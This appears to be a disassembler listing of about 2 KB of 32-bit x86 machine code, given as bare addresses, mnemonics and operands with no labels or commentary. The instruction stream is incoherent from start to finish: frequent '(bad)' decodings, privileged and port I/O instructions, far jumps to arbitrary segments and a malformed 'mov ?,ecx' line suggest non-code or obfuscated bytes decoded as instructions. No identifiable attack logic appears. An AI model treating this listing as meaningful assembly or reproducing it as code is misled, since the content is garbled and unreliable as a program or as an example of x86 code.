  42025a:	pop    ds
  42025b:	xchg   DWORD PTR [eax+0x7d0301cf],edi
  420261:	xor    BYTE PTR [ebp+0x5],al
  420264:	jmp    0x420235
  420266:	dec    esi
  420267:	pop    edx
  420268:	(bad)  
  420269:	add    BYTE PTR fs:[edi+0x2965c03f],al
  420270:	push   esi
  420271:	xchg   esi,eax
  420272:	data16 mov bh,0xc
  420275:	dec    DWORD PTR [edi+0x3d49097c]
  42027b:	adc    al,0xf5
  42027d:	repz fnstcw WORD PTR [edi+0x4118a7bb]
  420284:	jmp    0x95b37893
  420289:	or     DWORD PTR [edx],0x795d77fe
  42028f:	test   BYTE PTR [ebp+0x482b8ce5],al
  420295:	les    edi,FWORD PTR [ebx+0x4f]
  420298:	aam    0x34
  42029a:	ins    DWORD PTR es:[edi],dx
  42029b:	repz inc ecx
  42029d:	jmp    0x941ac23c
  4202a2:	fucomip st,st(4)
  4202a4:	push   ss
  4202a5:	out    dx,eax
  4202a6:	fs mov eax,0xfd04ec90
  4202ac:	sub    edx,DWORD PTR [ecx+0x36]
  4202af:	pop    ebp
  4202b0:	test   al,0xc9
  4202b2:	push   ss
  4202b3:	cs sahf 
  4202b5:	adc    BYTE PTR [edi-0x3e61b43b],0xea
  4202bc:	pop    ecx
  4202bd:	mov    cl,0xef
  4202bf:	or     dl,BYTE PTR [esi]
  4202c1:	and    bh,BYTE PTR [edi]
  4202c3:	inc    ebx
  4202c4:	pop    ds
  4202c5:	je     0x420286
  4202c7:	sbb    eax,0xbc3fa3bc
  4202cc:	mov    ds:0xf33378ac,eax
  4202d1:	gs inc esp
  4202d3:	in     al,0xfb
  4202d5:	ror    ecx,cl
  4202d7:	cdq    
  4202d8:	sahf   
  4202d9:	ror    dh,0x96
  4202dc:	in     al,0x89
  4202de:	inc    ebp
  4202df:	jp     0x420344
  4202e1:	nop
  4202e2:	rep outs dx,BYTE PTR ds:[esi]
  4202e4:	cwde   
  4202e5:	sub    dh,BYTE PTR [edx+0x3c]
  4202e8:	js     0x420273
  4202ea:	cmp    bl,ch
  4202ec:	(bad)  
  4202ef:	or     BYTE PTR [edx],al
  4202f1:	mov    eax,ds:0xb430afd8
  4202f6:	call   0xc21170ae
  4202fb:	or     al,0x2c
  4202fd:	xchg   ebp,eax
  4202fe:	xor    eax,0x2ddff558
  420303:	xor    dl,BYTE PTR [edx-0x27]
  420306:	ins    BYTE PTR es:[edi],dx
  420307:	push   es
  420308:	or     dh,bl
  42030a:	jne    0x42035b
  42030c:	mov    bh,0xb4
  42030e:	(bad)  
  42030f:	mov    DWORD PTR [ecx],ecx
  420311:	jae    0x42036a
  420313:	(bad)  
  420314:	fsub   QWORD PTR [ecx]
  420316:	mov    dh,0x4e
  420318:	test   eax,0x8c935ae4
  42031d:	lods   al,BYTE PTR ds:[esi]
  42031e:	pop    ebp
  42031f:	sti    
  420320:	push   0x973f4352
  420325:	push   ebp
  420326:	fistp  QWORD PTR [edi-0x46]
  420329:	stc    
  42032a:	sub    BYTE PTR [edi],ah
  42032c:	mov    al,ds:0xded1882f
  420331:	xchg   ebp,eax
  420332:	mov    fs,WORD PTR ds:0xe873672d
  420338:	out    0x2d,al
  42033a:	inc    eax
  42033b:	int3   
  42033c:	mov    ebp,0x7c8bc228
  420341:	(bad)  
  420342:	dec    eax
  420343:	dec    eax
  420344:	mov    WORD PTR [eax],ds
  420346:	(bad)  
  420347:	je     0x4202db
  420349:	xchg   edx,eax
  42034a:	(bad)  
  42034b:	fdiv   DWORD PTR [ecx]
  42034d:	gs nop
  42034f:	adc    BYTE PTR [ecx+edi*1+0x16],ch
  420353:	xor    eax,0xa81dc5ee
  420358:	in     al,dx
  420359:	jo     0x420335
  42035b:	(bad)  
  42035d:	leave  
  42035e:	add    al,0x19
  420360:	cmps   DWORD PTR fs:[esi],DWORD PTR es:[edi]
  420362:	mov    ecx,0xa4731441
  420367:	dec    eax
  420368:	jae    0x42035e
  42036a:	inc    esi
  42036b:	inc    ebp
  42036c:	fisubr WORD PTR [ebp+0x4f]
  42036f:	inc    bx
  420371:	dec    esi
  420372:	mov    bl,0xcb
  420374:	and    eax,0x9e4fd527
  420379:	push   edi
  42037a:	xor    eax,0x9c2bfd2c
  42037f:	aas    
  420380:	setb   dl
  420383:	dec    edi
  420384:	mov    BYTE PTR [ebx+ecx*4-0x4c],dh
  420388:	sahf   
  420389:	sub    esi,ebx
  42038b:	jmp    0x13f77055
  420390:	mov    cl,0x15
  420392:	in     al,0x32
  420394:	faddp  st(1),st
  420396:	push   esi
  420397:	jo     0x420323
  420399:	jp     0x42034f
  42039b:	imul   ebp,DWORD PTR [esi],0x20a0b4fa
  4203a1:	adc    DWORD PTR [edx],ebp
  4203a3:	adc    eax,0x842b787e
  4203a8:	outs   dx,DWORD PTR ds:[esi]
  4203a9:	pusha  
  4203aa:	dec    ecx
  4203ab:	push   ss
  4203ac:	sub    BYTE PTR [edx],al
  4203ae:	mov    dl,0x4
  4203b0:	add    ecx,DWORD PTR [ecx-0x11]
  4203b3:	push   ebp
  4203b4:	loop   0x420355
  4203b6:	adc    bh,ah
  4203b8:	dec    ebx
  4203b9:	fisubr DWORD PTR [eax]
  4203bb:	in     eax,0xf1
  4203bd:	push   0x56
  4203bf:	test   DWORD PTR [esi+eiz*1],esp
  4203c2:	pop    edx
  4203c3:	push   ebx
  4203c4:	mov    eax,ebp
  4203c6:	mov    dh,0x1b
  4203c8:	mov    esp,0x33161916
  4203cd:	stos   BYTE PTR es:[edi],al
  4203ce:	jnp    0x420447
  4203d0:	sti    
  4203d1:	push   esi
  4203d2:	shr    edi,cl
  4203d4:	mov    WORD PTR [esi-0x30],ss
  4203d7:	test   al,0x8a
  4203d9:	cld    
  4203da:	mov    ecx,0xb44ce31e
  4203df:	outs   dx,BYTE PTR ds:[esi]
  4203e0:	fdivr  QWORD PTR ds:0x25b56772
  4203e6:	mov    ds:0xdd9a1a8a,al
  4203eb:	pop    esp
  4203ec:	sti    
  4203ed:	sub    ebp,DWORD PTR [ebp-0x1f3ecf3d]
  4203f3:	repz add BYTE PTR [edi+0x45e73c15],bh
  4203fa:	das    
  4203fb:	clc    
  4203fc:	cld    
  4203fd:	(bad)  
  4203fe:	jo     0x4203c1
  420400:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420401:	in     al,0x46
  420403:	mov    esi,ebx
  420405:	sbb    BYTE PTR [edx+edx*1+0x437f7119],ah
  42040c:	adc    DWORD PTR [eax],esp
  42040e:	inc    ebp
  42040f:	daa    
  420410:	push   esi
  420411:	dec    edi
  420412:	frstor [eax+0x61]
  420415:	stos   DWORD PTR es:[edi],eax
  420416:	jne    0x420462
  420418:	je     0x4203ba
  42041a:	xor    esi,DWORD PTR [eax]
  42041c:	inc    ecx
  42041d:	in     al,dx
  42041e:	sbb    eax,0xf918dd9e
  420423:	jno    0x420422
  420425:	sbb    BYTE PTR [esi+ebx*8-0x3452801f],ah
  42042c:	call   DWORD PTR [esi+0x6904e252]
  420432:	jnp    0x4203e1
  420434:	pop    edi
  420435:	cli    
  420436:	mov    edi,0x45114373
  42043b:	retf   
  42043c:	das    
  42043d:	jo     0x4203c3
  42043f:	test   eax,0x5d91a4ed
  420444:	mov    BYTE PTR [ebp+0x32],ch
  420447:	out    0x27,al
  420449:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42044a:	repnz or DWORD PTR [ecx+0x8],eax
  42044e:	ret    
  42044f:	mov    dl,0xa
  420451:	add    al,0x29
  420453:	inc    eax
  420454:	or     DWORD PTR [esi+0x59],eax
  420457:	icebp  
  420458:	mov    eax,0x9cb904cc
  42045d:	add    al,0xae
  42045f:	leave  
  420460:	pop    es
  420461:	xor    DWORD PTR [ecx],0x17f38b54
  420467:	push   eax
  420468:	inc    edx
  420469:	fbld   TBYTE PTR [edi]
  42046b:	scas   al,BYTE PTR es:[edi]
  42046c:	sar    BYTE PTR [edx-0x2fd632bc],1
  420472:	arpl   bx,bx
  420474:	mov    esp,ebx
  420476:	cmp    DWORD PTR [ebp+0x48c3b932],edx
  42047c:	add    al,0x70
  42047e:	mov    eax,0x6c2e37df
  420483:	xor    BYTE PTR [ecx+0x76dfd031],bl
  420489:	sbb    BYTE PTR [esi+0x11966ae4],ah
  42048f:	mov    ds:0xe065af71,eax
  420494:	xchg   edx,eax
  420495:	add    eax,0x3766ff2b
	...
  420512:	add    BYTE PTR [eax],al
  420514:	adc    al,0xcb
  420516:	mov    bl,0x9a
  420518:	(bad)  
  420519:	cli    
  42051a:	cmp    eax,0x190968cf
  42051f:	mov    esi,esi
  420521:	neg    BYTE PTR [edi+0x19e410a]
  420527:	add    BYTE PTR [esi+0x7],ch
  42052a:	add    BYTE PTR [eax],al
  42052c:	mov    ah,0xa8
  42052e:	jns    0x420536
  420530:	loopne 0x420527
  420532:	pop    esp
  420533:	adc    esp,edx
  420535:	jo     0x420563
  420537:	mov    al,dl
  420539:	lds    ebx,FWORD PTR [edx]
  42053b:	pop    edi
  42053c:	or     DWORD PTR [edi+0x18443612],edi
  420542:	icebp  
  420543:	mov    edx,0xbe7facd
  420548:	fld    QWORD PTR [ecx*1-0x2c4ca217]
  42054f:	loop   0x42050f
  420551:	push   ss
  420552:	in     al,0x83
  420554:	and    ch,cl
  420556:	add    DWORD PTR [ecx-0x6b],esi
  420559:	push   ebx
  42055a:	lsl    esp,WORD PTR [eax+ebx*8+0x21]
  42055f:	clc    
  420560:	into   
  420561:	jns    0x42055a
  420563:	adc    esp,0x26
  420566:	ja     0x4204f6
  420568:	mov    edi,0x2c4dd701
  42056d:	or     esp,DWORD PTR [edi]
  42056f:	mov    cl,0xd5
  420571:	popf   
  420572:	push   ss
  420573:	into   
  420574:	push   ebx
  420575:	dec    esi
  420576:	and    edx,0x3adc8812
  42057c:	jno    0x42052e
  42057e:	xchg   edx,eax
  42057f:	mov    al,ds:0x8316a47
  420584:	xchg   esi,eax
  420585:	shr    BYTE PTR [ebx],cl
  420587:	popa   
  420588:	push   ebp
  420589:	jl     0x420539
  42058b:	jne    0x42056e
  42058d:	add    bh,BYTE PTR [edx+0x5b3f105b]
  420593:	test   BYTE PTR [ebp-0x1c],bh
  420596:	cdq    
  420597:	out    0x76,eax
  420599:	out    dx,eax
  42059a:	sub    bh,BYTE PTR gs:[esi+0x47]
  42059e:	sbb    ebx,DWORD PTR [ebp-0x6f148d74]
  4205a4:	push   ebp
  4205a5:	addr16 sbb eax,0x17799222
  4205ab:	aad    0xcc
  4205ad:	retf   0x4b74
  4205b0:	adc    bl,BYTE PTR [esi+esi*2]
  4205b3:	ret    
  4205b4:	clc    
  4205b5:	xor    BYTE PTR [eax+esi*8],cl
  4205b8:	add    DWORD PTR es:[eax],0xf3e01f40
  4205bf:	nop
  4205c0:	std    
  4205c1:	push   ebx
  4205c2:	pushf  
  4205c3:	and    cl,ah
  4205c5:	sahf   
  4205c6:	xor    eax,0x6c23bee8
  4205cb:	or     BYTE PTR ds:0x3cc27531,dh
  4205d1:	adc    eax,0x3e07dd40
  4205d6:	adc    DWORD PTR [edx+0x45],0xffffffa1
  4205da:	and    al,0xda
  4205dc:	pop    ebx
  4205dd:	and    al,0x66
  4205df:	lock add edx,ebp
  4205e2:	adc    esi,ecx
  4205e4:	xchg   edx,eax
  4205e5:	loopne 0x42065c
  4205e7:	push   ebx
  4205e8:	cmp    BYTE PTR [ebp-0x40f4b825],cl
  4205ee:	pusha  
  4205ef:	push   eax
  4205f0:	enter  0x23d9,0x6c
  4205f4:	ret    
  4205f5:	push   ds
  4205f6:	aaa    
  4205f7:	cld    
  4205f8:	cwde   
  4205f9:	ja     0x420622
  4205fb:	sub    BYTE PTR [eax],ah
  4205fd:	push   edi
  4205fe:	mov    esi,0xc50c45e5
  420603:	cwde   
  420604:	mov    ah,0xcf
  420606:	xor    bl,BYTE PTR [ebx-0x111607d0]
  42060c:	jno    0x4205ff
  42060e:	mov    edx,0x7e52a41d
  420613:	mov    edx,0x79398ee8
  420618:	(bad)  
  420619:	cli    
  42061a:	mov    bh,0x7e
  42061c:	sub    dh,BYTE PTR [edx+0x4ac5be79]
  420622:	or     BYTE PTR [edx],bh
  420624:	or     al,BYTE PTR [ebx-0xe278f70]
  42062a:	mov    BYTE PTR [esi-0x631dbcec],ch
  420630:	xchg   ebx,eax
  420631:	loopne 0x420623
  420633:	mov    ecx,0xb8018742
  420638:	loope  0x420617
  42063a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42063b:	retf   
  42063c:	add    edx,esi
  42063e:	adc    dh,BYTE PTR [eax+0x513cbfd1]
  420644:	fcmovb st,st(5)
  420646:	data16 movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420648:	(bad)  
  420649:	idiv   DWORD PTR [ebx+0x77]
  42064c:	out    dx,eax
  42064d:	mov    cl,BYTE PTR [ebx]
  42064f:	loope  0x420688
  420651:	dec    edx
  420652:	mov    WORD PTR [edx+edx*8+0x53556247],es
  420659:	cmc    
  42065a:	and    edi,edi
  42065c:	inc    eax
  42065d:	and    al,0x7e
  42065f:	mov    ds:0x144cb29b,al
  420664:	lods   al,BYTE PTR ds:[esi]
  420665:	and    al,0x33
  420667:	cwde   
  420668:	les    edi,FWORD PTR [edx+ebp*2-0x74f977ef]
  42066f:	data16 shl BYTE PTR [ebp+eax*8+0x7870649c],1
  420677:	(bad)  
  420679:	ret    0x1a98
  42067c:	dec    edx
  42067d:	loopne 0x42062b
  42067f:	push   0x4b
  420681:	pop    ebp
  420682:	jg     0x4206f2
  420684:	sbb    al,0x26
  420686:	aad    0xee
  420688:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420689:	jnp    0x4206d2
  42068b:	add    eax,0x52b647c4
  420690:	out    0x9e,eax
  420692:	or     eax,0x44cfdada
  420697:	lahf   
  420698:	push   ss
  420699:	pusha  
  42069a:	push   edi
  42069b:	inc    ecx
  42069c:	repz dec edi
  42069e:	enter  0xf7db,0x40
  4206a2:	pop    ss
  4206a3:	or     al,BYTE PTR [eax-0x674d3d24]
  4206a9:	ret    0x2997
  4206ac:	js     0x420684
  4206ae:	inc    ebp
  4206af:	add    al,0x30
  4206b1:	mov    ds:0x53a90,al
  4206b6:	pop    ebp
  4206b7:	popa   
  4206b8:	js     0x420655
  4206ba:	cmp    al,0x88
  4206bc:	fdivrp st(4),st
  4206be:	xchg   ebp,eax
  4206bf:	ret    
  4206c0:	push   esi
  4206c1:	outs   dx,BYTE PTR ds:[esi]
  4206c2:	(bad)  
  4206c3:	test   eax,0x34091ed7
  4206c8:	mov    ch,0xb
  4206ca:	scas   al,BYTE PTR es:[edi]
  4206cb:	(bad)
  4206ce:	retf   
  4206cf:	int    0x21
  4206d1:	mov    DWORD PTR [ecx+0x3c],ecx
  4206d4:	mov    ecx,0x7521663a
  4206d9:	jecxz  0x42065d
  4206db:	das    
  4206dc:	rcr    BYTE PTR ds:0x6fd4e6a6,0x5d
  4206e3:	adc    cl,BYTE PTR ds:0xf41576e9
  4206e9:	or     ch,al
  4206eb:	inc    ebx
  4206ec:	mov    eax,ds:0x366f1ef
  4206f1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4206f2:	or     eax,0xde56eb80
  4206f7:	daa    
  4206f8:	fimul  WORD PTR [ecx+ebx*2+0x54]
  4206fc:	test   al,0x60
  4206fe:	test   DWORD PTR [eax],edx
  420700:	jecxz  0x420737
  420702:	test   al,0xf8
  420704:	les    ebp,FWORD PTR [ebp-0x587bf396]
  42070a:	fidivr WORD PTR [edx+0x6f65dbaf]
  420710:	jne    0x420698
  420712:	and    eax,0x425019a4
  420717:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420718:	inc    eax
  420719:	mov    esi,0x2ccb6814
  42071e:	push   edx
  42071f:	xlat   BYTE PTR ds:[ebx]
  420720:	ins    DWORD PTR es:[edi],dx
  420721:	dec    esi
  420722:	or     BYTE PTR [esi-0x2eed6bbb],ch
  420728:	aam    0x14
  42072a:	push   edx
  42072b:	aas    
  42072c:	push   ebx
  42072d:	xor    ah,BYTE PTR [eax+ecx*8]
  420730:	cwde   
  420731:	sub    eax,0xf03a6c11
  420736:	in     eax,0x4c
  420738:	idiv   BYTE PTR [esi+0x2]
  42073b:	cdq    
  42073c:	mov    esp,0x9e209a1a
  420741:	sbb    BYTE PTR [ebx+0x4d],cl
  420744:	jmp    0x420777
  420746:	icebp  
  420747:	iret   
  420748:	mov    ?,ecx
  42074a:	sbb    al,0x67
  42074c:	and    ecx,ecx
  42074e:	adc    al,0x3a
  420750:	xchg   esi,eax
  420751:	push   0x4e579d25
  420756:	out    dx,al
  420757:	add    esi,ecx
  420759:	inc    edi
  42075a:	xor    esi,0x257c042c
  420760:	adc    bl,0x7b
  420763:	ja     0x4207e0
  420765:	or     dl,ch
  420767:	es pop eax
  420769:	xor    eax,edx
  42076b:	sbb    al,0x4d
  42076d:	ret    0x48c0
  420770:	xchg   ecx,eax
  420771:	icebp  
  420772:	mov    ah,0x70
  420774:	cs clc 
  420776:	cmp    eax,0xbceba0c5
  42077b:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  42077c:	dec    edx
  42077d:	or     ch,BYTE PTR [esi+0xf0eedad]
  420783:	and    al,0xa9
  420785:	xchg   BYTE PTR [ecx],dh
  420787:	sub    dh,bh
  420789:	mov    bh,0xef
  42078b:	gs add al,0xa8
  42078f:	xor    BYTE PTR [ebx],bl
  420791:	scas   eax,DWORD PTR es:[edi]
  420792:	idiv   BYTE PTR [edi-0x31]
  420795:	cdq    
  420796:	add    esp,esp
  420798:	push   ebx
  420799:	xor    ecx,eax
  42079b:	shl    BYTE PTR [ecx],cl
  42079d:	js     0x4207bb
  42079f:	shr    DWORD PTR [edi+eiz*8+0x1970327f],cl
  4207a6:	push   edx
  4207a7:	xor    DWORD PTR [edi-0x7a],0xffffff9c
  4207ab:	push   es
  4207ac:	out    dx,eax
  4207ad:	imul   al
  4207af:	adc    al,0x93
  4207b1:	push   ecx
  4207b2:	imul   DWORD PTR [eax+ebx*1-0x37]
  4207b6:	dec    ecx
  4207b7:	cmp    BYTE PTR [eax],dh
  4207b9:	icebp  
  4207ba:	adc    BYTE PTR [eax+0x5c438579],cl
  4207c0:	dec    ebp
  4207c1:	test   BYTE PTR [edi-0x9],dl
  4207c4:	mov    ebx,0xaf629710
  4207c9:	jg     0x4207a5
  4207cb:	xchg   esi,eax
  4207cc:	fdivr  QWORD PTR [edx+0x19378f7e]
  4207d2:	int3   
  4207d3:	hlt    
  4207d4:	mov    ds:0xf8afffd9,eax
  4207d9:	and    BYTE PTR [ebx+ecx*4+0x23],0xaf
  4207de:	fistp  DWORD PTR [ecx+0x104c1d0a]
  4207e4:	and    eax,0x74792e61
  4207e9:	into   
  4207ea:	ficom  WORD PTR [esi+0x31]
  4207ed:	sar    BYTE PTR [ebx],0x4d
  4207f0:	push   eax
  4207f1:	fdivr  QWORD PTR [edx]
  4207f3:	arpl   WORD PTR [ebp+0x6a5d4d99],sp
  4207f9:	aas    
  4207fa:	lods   al,BYTE PTR ds:[esi]
  4207fb:	mov    al,0xd
  4207fd:	jle    0x42084e
  4207ff:	ret    
  420800:	test   edi,ecx
  420802:	push   es
  420803:	loope  0x420800
  420805:	cdq    
  420806:	cmp    DWORD PTR [eax-0x4e],esp
  420809:	jb     0x4207a3
  42080b:	sub    bh,BYTE PTR [ebp+0x4abf3ba6]
  420811:	cmp    DWORD PTR [eax+0x6265f996],eax
  420817:	add    ch,BYTE PTR [edi]
  420819:	fmul   DWORD PTR [esi]
  42081b:	add    cl,0x31
  42081e:	outs   dx,BYTE PTR ds:[esi]
  42081f:	cmp    al,0x2e
  420821:	pop    edi
  420822:	mov    esi,0x47938d58
  420827:	pop    ecx
  420828:	or     al,0x9b
  42082a:	jg     0x420874
  42082c:	fxsave [ebx-0x23]
  420830:	sub    ah,BYTE PTR [eax-0x7b1edd9f]
  420836:	adc    DWORD PTR [esi-0x1ea89c08],ebp
  42083c:	push   ebx
  42083d:	aaa    
  42083e:	mov    edi,0x78372b0d
  420843:	sbb    bl,bh
  420845:	and    al,0x13
  420847:	add    DWORD PTR [edi-0x40773699],0xffffffe6
  42084e:	popf   
  42084f:	mov    ds:0x48684b32,eax
  420854:	or     ebx,0x6d4fc311
  42085a:	dec    esp
  42085b:	adc    ch,dl
  42085d:	adc    BYTE PTR [ebx],0x3c
  420860:	(bad)  
  420862:	sub    ebp,DWORD PTR [edi-0x7befb9b1]
  420868:	sar    DWORD PTR [edx+edi*1-0x4b],cl
  42086c:	js     0x42089c
  42086e:	stos   BYTE PTR es:[edi],al
  42086f:	dec    ebp
  420870:	ds and eax,0x1750431d
  420876:	sbb    DWORD PTR [eax],edi
  420878:	jg     0x420834
  42087a:	push   es
  42087b:	ss mov ebp,0x12c10023
  420881:	push   esp
  420882:	cwde   
  420883:	xchg   ecx,eax
  420884:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  420885:	sbb    BYTE PTR [ecx],ah
  420887:	jg     0x420856
  420889:	xchg   ecx,eax
  42088a:	mov    al,0x4a
  42088c:	sbb    eax,0xcc30338c
  420891:	sbb    bl,BYTE PTR [edx]
  420893:	jmp    0xaae2:0xd8321e1a
  42089a:	add    BYTE PTR [ebx-0x606178e4],al
  4208a0:	inc    ecx
  4208a1:	imul   edi,DWORD PTR [ebp-0x3d],0x44
  4208a5:	lahf   
  4208a6:	imul   eax,ecx,0xffffffa1
  4208a9:	inc    eax
  4208aa:	mov    ebp,0x962f01df
  4208af:	adc    BYTE PTR [ecx-0xdfce18c],ah
  4208b5:	es loop 0x420883
  4208b8:	loope  0x420843
  4208ba:	fiadd  WORD PTR [eax+eiz*4-0x55]
  4208be:	adc    BYTE PTR [edi-0x78fa3963],0xae
  4208c5:	dec    edx
  4208c6:	mov    ebp,0x5c97e165
  4208cb:	add    edi,ebp
  4208cd:	data16 fdivr QWORD PTR [esi]
  4208d0:	fwait
  4208d1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4208d2:	je     0x42085c
  4208d4:	inc    ebp
  4208d5:	or     ebp,DWORD PTR [edi+0x6ce24da8]
  4208db:	leave  
  4208dc:	sbb    BYTE PTR [edx*8-0x2806db8],0x8
  4208e4:	stos   BYTE PTR es:[edi],al
  4208e5:	shr    BYTE PTR [edx+0x18e39049],cl
  4208eb:	inc    eax
  4208ec:	pop    edi
  4208ed:	std    
  4208ee:	mov    ebp,0x80a34044
  4208f3:	sar    eax,0xdd
  4208f6:	out    dx,al
  4208f7:	repz mov esi,0xe3137557
  4208fd:	(bad)  
  4208fe:	hlt    
  4208ff:	mov    cs,WORD PTR [ecx+0x3de7e7ff]
  420905:	mov    eax,ds:0x3982b7d8
  42090a:	push   esp
  42090b:	es xchg edi,eax
  42090d:	adc    eax,0x494d8501
  420912:	xor    BYTE PTR [ebp+eiz*8-0x31],ch
  420916:	mov    al,0x2d
  420918:	mov    ebx,0x592ffb1e
  42091d:	pop    esp
  42091e:	pop    edx
  42091f:	pop    edi
  420920:	loope  0x42096f
  420922:	sbb    BYTE PTR [ebp-0x49],ah
  420925:	sub    BYTE PTR [ecx],al
  420927:	xchg   ebx,eax
  420928:	mov    esp,0x4fd6628a
  42092d:	fsubrp st(3),st
  42092f:	outs   dx,BYTE PTR ds:[esi]
  420930:	in     al,dx
  420931:	sub    al,0xa5
  420933:	pushf  
  420934:	bound  esp,QWORD PTR [edi+0x77]
  420937:	enter  0x5ec3,0xa5
  42093b:	sbb    bh,BYTE PTR [eax+eiz*1-0x5cfe64b1]
  420942:	test   al,0x5f
  420944:	or     esp,esi
  420946:	dec    DWORD PTR [esi+0x6e]
  420949:	sub    dh,bl
  42094b:	adc    al,0xc5
  42094d:	fimul  DWORD PTR [esp+edi*2+0x664db546]
  420954:	xlat   BYTE PTR ds:[ebx]
  420955:	xchg   ebp,eax
  420956:	cmp    ah,BYTE PTR [ebx]
  420958:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420959:	pop    ss
  42095a:	add    eax,0xd72ae713
  42095f:	adc    al,0x44
  420961:	xor    DWORD PTR [ebp+0x6d9d01a1],esp
  420967:	mov    ch,BYTE PTR [edx*4+0x7961445b]
  42096e:	adc    edi,esp
  420970:	mov    bh,0x41
  420972:	sub    BYTE PTR [esi],dl
  420974:	sbb    al,0xe4
  420976:	mov    ch,0x3b
  420978:	cmc    
  420979:	shr    BYTE PTR [edi-0x7a860e9],cl
  42097f:	fcmovne st,st(7)
  420981:	xchg   edi,eax
  420982:	jae    0x42098a
  420984:	mov    edi,0xd6bc370b
  420989:	mov    ebx,DWORD PTR [ebx]
  42098b:	dec    eax
  42098c:	outs   dx,DWORD PTR ds:[esi]
  42098d:	jge    0x42091d
  42098f:	add    eax,0xcc72c833
  420994:	cmp    eax,ebp
  420996:	jae    0x4209fd
  420998:	arpl   WORD PTR [ebx+0xd],cx
  42099b:	popf   
  42099c:	js     0x420985
  42099e:	add    al,0xd8
  4209a0:	push   edi
  4209a1:	je     0x42096b
  4209a3:	mov    ch,0xf5
  4209a5:	mov    eax,ds:0x85cf6d72
  4209aa:	sub    dh,ch
  4209ac:	xchg   esi,eax
  4209ad:	add    al,0xd8
  4209af:	adc    eax,0x4d23bbb4
  4209b4:	imul   eax,eax,0x2b
  4209b7:	sub    al,0xd9
  4209b9:	cmp    edi,0xfffffff3
  4209bc:	loop   0x42094f
  4209be:	mov    esi,0xeb29a2ef
  4209c3:	arpl   WORD PTR [ebx+edx*1-0x39],cx
  4209c7:	outs   dx,BYTE PTR ds:[esi]
  4209c8:	sbb    ch,BYTE PTR [esp+esi*8+0x68fa229c]
  4209cf:	aam    0x79
  4209d1:	popf   
  4209d2:	in     eax,0x84
  4209d4:	loop   0x4209ef
  4209d6:	mov    bh,0xd
  4209d8:	fdiv   DWORD PTR [ecx-0x689f4423]
  4209de:	dec    eax
  4209df:	leave  
  4209e0:	lds    ebp,FWORD PTR [eax-0x3cbc33a9]
  4209e6:	cmp    DWORD PTR [esi],esi
  4209e8:	clc    
  4209e9:	jp     0x420a4b
  4209eb:	or     BYTE PTR [esi+0x12],al
  4209ee:	xchg   ebx,eax
  4209ef:	int3   
  4209f0:	jae    0x420a3f
  4209f2:	popf   
  4209f3:	jae    0x420a4f
  4209f5:	jmp    0x420a1a
  4209f7:	test   DWORD PTR [edi],edx
  4209f9:	or     ecx,eax
  4209fb:	sub    DWORD PTR [edx+ecx*4+0x37],eax
  4209ff:	div    ebp
  420a01:	mov    al,0xa8
  420a03:	int    0x36
  420a05:	pop    ds
  420a06:	mov    ah,0x6
  420a08:	fmulp  st(4),st
  420a0a:	sbb    BYTE PTR [ecx],ch
  420a0c:	cmp    DWORD PTR [edi-0x992c8f],eax
  420a12:	fs jmp 0x6fa9:0x13529e7c
  420a1a:	out    dx,al
  420a1b:	adc    edx,ecx
  420a1d:	push   0xa4fa846
  420a22:	mov    gs:0x2c7be57d,al
  420a28:	rcr    BYTE PTR [ecx+0x6c],1
  420a2b:	shl    BYTE PTR [edi-0x35],0xa8
  420a2f:	pop    ecx
  420a30:	jno    0x420a45
  420a32:	jnp    0x420a7c
  420a34:	or     eax,0x71ca01d7
  420a39:	ja     0x420a43
  420a3b:	xor    BYTE PTR ds:0xad76fae8,dh
  420a41:	add    BYTE PTR [edx],0x18
  420a44:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420a45:	test   edx,0x773d6373
  420a4b:	retf   
  420a4c:	jecxz  0x420a70
  420a4e:	cmp    BYTE PTR [ebx+esi*4-0x43b76f5d],cl
  420a55:	mov    WORD PTR [eax+0x37d98222],bp
  420a5c:	push   0xffffffa8
  420a5e:	xchg   esi,eax
  420a5f:	pusha  
  420a60:	or     eax,0x88322dfd
  420a65:	and    DWORD PTR ds:0xade1e262,esi
  420a6b:	xchg   ecx,eax
  420a6c:	jmp    0xd0f5:0xd417a54a
  420a73:	das    
  420a74:	push   0x67
  420a76:	ins    BYTE PTR es:[edi],dx
  420a77:	clc    
  420a78:	sbb    al,0x49
  420a7a:	add    ch,BYTE PTR [edi]
  420a7c:	test   ebx,0xecdb8ba8
  420a82:	mov    BYTE PTR [ebp-0x42073fc0],0xe9
  420a89:	sub    ch,BYTE PTR [ebx]
  420a8b:	repz daa 
  420a8d:	jbe    0x420ad9
  420a8f:	cld    
  420a90:	jne    0x420a42
  420a92:	mov    ebx,0x97588073
  420a97:	pop    edx
  420a98:	ret    
  420a99:	mov    ebx,0x86327a56
  420a9e:	fs hlt 
  420aa0:	and    al,0x3e
  420aa2:	call   0x4fda:0x6a873ae5
  420aa9:	test   al,0x31
  420aab:	xchg   BYTE PTR ds:[edi],bh
  420aae:	lahf   
  420aaf:	sub    ah,BYTE PTR [esi]
  420ab1:	xor    al,ch
  420ab3:	in     al,dx
  420ab4:	jg     0x420b0c
  420ab6:	mov    ds:0xd4b92d53,eax
  420abb:	mov    esp,0x65ca2d8e
  420ac0:	enter  0xbaab,0xca
  420ac4:	loop   0x420ad1
  420ac6:	and    DWORD PTR [edx-0x7541cde7],eax
  420acc:	sbb    esp,DWORD PTR [eax-0x6f0cfa05]
  420ad2:	aad    0x13
  420ad4:	fmul   st,st(5)
  420ad6:	mov    ebp,0x9b82d976
  420adb:	jno    0x420a83
  420add:	call   0x55c1:0x1ffb95e1
  420ae4:	mov    ds:0xc449ab44,al
  420ae9:	sub    edx,DWORD PTR [esi+0x2215ac1b]
  420aef:	cmp    edi,DWORD PTR [esp+ebx*8-0x1e]
  420af3:	mul    edx
  420af5:	jge    0x420b74
  420af7:	fldcw  WORD PTR [edx-0x50d9ab73]
  420afd:	gs pop ebx
  420aff:	jg     0x420b34
  420b01:	sbb    al,0xf4
